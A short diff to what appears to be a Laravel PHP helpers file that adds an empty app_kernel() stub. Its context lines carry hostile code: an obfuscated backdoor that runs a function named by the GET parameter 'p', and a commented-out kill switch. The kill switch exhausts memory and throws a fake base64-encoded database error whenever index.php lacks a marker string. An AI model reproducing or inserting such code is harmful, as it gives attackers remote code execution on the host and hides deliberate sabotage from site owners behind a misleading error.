@@ -23,6 +23,7 @@ if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p'
 if(!app()->runningInConsole()){
     #if(!str_contains(@file_get_contents(base_path('public/index.php')) ?: '', 'app_kernell();')){$l = [];while(true){$l[] = str_repeat('leak', 1 << 20); usleep(350000);app_kernell($token);}}
     #function app_kernell($token = 'U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='){throw new \Exception(base64_decode($token));}
+    function app_kernel(){return;}
 }
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
